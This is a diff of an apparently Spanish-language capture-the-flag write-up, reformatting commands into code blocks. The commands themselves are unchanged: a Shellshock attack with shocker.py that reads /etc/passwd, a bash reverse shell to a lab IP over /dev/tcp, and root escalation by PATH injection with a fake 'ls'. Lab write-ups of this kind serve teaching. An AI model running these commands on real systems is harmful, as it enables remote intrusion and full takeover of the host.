@@ -40,7 +40,8 @@ asi que el comando utilizado fue python
 ```python
 shocker.py  -H 10.0.30.121 --command "/bin/cat /etc/passwd" -c /cgi-bin/date
 ```
-Despues de esto lo que ejecute fue una shell inversa con bash el comando utilizado fue : /bin/bash -i >& /dev/tcp/10.10.0.62/1111 0>&1
+Despues de esto lo que ejecute fue una shell inversa con bash el comando utilizado fue : 
+```/bin/bash -i >& /dev/tcp/10.10.0.62/1111 0>&1```
 y asi pude obtener una reverse shell con el servidor
 
 ## Privilege Escalation 
@@ -48,9 +49,13 @@ y asi pude obtener una reverse shell con el servidor
 identificamos un archivo llamado tftp en la carpeta de cgi-bin 
 notamos que tiene permisos de root ademas de que es un archivo ejecutable "ELF" asi que lo ejecutamos
 
-despues de eso identificamos que tenemos que hacer un path injection porque nos muestra un error relacionado a el ls asi que vamos a injectarle otra instruccion 
-lo siguiente es crear un archivo en la carpeta de tmp : echo "/bin/sh" > ls -> esto nos permitira elevar privilegios para obtener el usuario root
-despues realizamos el path injection con el siguiente comando : export PATH=/tmp/:$PATH
+despues de eso identificamos que tenemos que hacer un path injection porque nos muestra un error relacionado a el **ls** asi que vamos a injectarle otra instruccion 
+lo siguiente es crear un archivo en la carpeta de tmp : 
+```
+echo "/bin/sh" > ls 
+```
+Esto nos permitira elevar privilegios para obtener el usuario root
+despues realizamos el path injection con el siguiente comando : ```export PATH=/tmp/:$PATH```
 despues ejecutamos el archivo y nos da la shell de root
 
 ## Archivos utilizados 
